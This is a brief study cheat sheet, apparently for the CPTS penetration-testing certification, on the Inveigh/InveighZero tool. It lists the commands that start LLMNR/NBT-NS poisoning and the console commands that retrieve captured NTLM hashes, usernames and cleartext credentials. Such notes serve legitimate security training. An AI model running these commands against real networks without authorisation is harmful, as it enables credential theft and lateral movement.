---
tags: [cpts, tool, inveigh, llmnr, nbtns, mitm]
---

# 🧰 Inveigh / InveighZero

## 📦 Install
See [[Tool-Install]]. C# build (InveighZero) is the maintained version; PowerShell build is legacy.

## 🎯 Purpose
Windows-native LLMNR/NBT-NS/mDNS/DHCPv6/HTTP(S)/SMB/LDAP MITM + NTLM capture tool — the Windows counterpart to Responder.

## 🧱 Core syntax
```powershell
# PowerShell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
Stop-Inveigh

# C#
.\Inveigh.exe
```

## 🚩 Interactive console (press ESC to enter/exit)
```text
HELP
GET NTLMV1 / GET NTLMV2
GET NTLMV1UNIQUE / GET NTLMV2UNIQUE
GET NTLMV1USERNAMES / GET NTLMV2USERNAMES
GET CLEARTEXT / GET CLEARTEXTUNIQUE
GET LOG
GET CONSOLE
SET CONSOLE
HISTORY
RESUME
STOP
```

## 🔧 Variants
```powershell
# Enumerate Invoke-Inveigh's full parameter set
(Get-Command Invoke-Inveigh).Parameters

# Typical capture session, then pull unique hashes + usernames
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# [ESC]
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```

File output directory is set at startup (e.g. `C:\Tools`).

#inveigh #llmnr #cpts
